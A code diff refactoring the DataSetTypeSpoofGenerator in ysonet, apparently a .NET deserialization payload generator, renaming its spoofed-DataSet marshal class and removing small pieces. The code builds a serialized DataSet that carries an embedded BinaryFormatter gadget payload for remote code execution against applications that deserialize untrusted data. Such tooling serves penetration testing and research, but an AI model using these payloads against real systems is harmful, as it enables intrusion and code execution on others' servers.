@@ -1,6 +1,4 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Data;
 using System.IO;
 using System.Runtime.Serialization;
 using System.Runtime.Serialization.Formatters.Binary;
@@ -10,11 +8,6 @@ namespace ysonet.Generators
 {
     public class DataSetTypeSpoofGenerator : DataSetGenerator
     {
-        public override string Name()
-        {
-            return "DataSetTypeSpoof";
-        }
-
         public override string Contributors()
         {
             return "Soroush Dalili, Markus Wulftange, Jang";
@@ -42,8 +35,8 @@ namespace ysonet.Generators
                 binaryFormatterPayload = (byte[])new TextFormattingRunPropertiesGenerator().GenerateWithNoTest("BinaryFormatter", inputArgs);
             }
 
-                
-            DataSetSpoofMarshal payloadDataSetMarshal = new DataSetSpoofMarshal(binaryFormatterPayload);
+
+            DataSetBinarySpoofMarshal payloadDataSetMarshal = new DataSetBinarySpoofMarshal(binaryFormatterPayload);
             if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
                 || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase)
                 || formatter.Equals("soapformatter", StringComparison.OrdinalIgnoreCase))
@@ -59,7 +52,7 @@ namespace ysonet.Generators
 
     // https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf
     [Serializable]
-    public class DataSetSpoofMarshal : ISerializable
+    public class DataSetBinarySpoofMarshal : ISerializable
     {
         byte[] _fakeTable;
 
@@ -75,7 +68,7 @@ namespace ysonet.Generators
             info.AddValue("DataSet.CaseSensitive", false);
             info.AddValue("DataSet.LocaleLCID", 0x409);
             info.AddValue("DataSet.EnforceConstraints", false);
-            info.AddValue("DataSet.ExtendedProperties", (System.Data.PropertyCollection) null);
+            info.AddValue("DataSet.ExtendedProperties", (System.Data.PropertyCollection)null);
             info.AddValue("DataSet.Tables.Count", 1);
             info.AddValue("DataSet.Tables_0", _fakeTable);
         }
@@ -85,17 +78,17 @@ namespace ysonet.Generators
             _fakeTable = bfPayload;
         }
 
-        public DataSetSpoofMarshal(byte[] bfPayload)
+        public DataSetBinarySpoofMarshal(byte[] bfPayload)
         {
             SetFakeTable(bfPayload);
         }
 
-        public DataSetSpoofMarshal(object fakeTable) : this(fakeTable, new InputArgs())
+        public DataSetBinarySpoofMarshal(object fakeTable) : this(fakeTable, new InputArgs())
         {
             // This won't use anything we might have defined in ysonet.net BinaryFormatter process (such as minification)
         }
 
-        public DataSetSpoofMarshal(object fakeTable, InputArgs inputArgs)
+        public DataSetBinarySpoofMarshal(object fakeTable, InputArgs inputArgs)
         {
             MemoryStream stm = new MemoryStream();
             if (inputArgs.Minify)
@@ -113,7 +106,7 @@ namespace ysonet.Generators
             SetFakeTable(stm.ToArray());
         }
 
-        public DataSetSpoofMarshal(MemoryStream ms)
+        public DataSetBinarySpoofMarshal(MemoryStream ms)
         {
             SetFakeTable(ms.ToArray());
         }
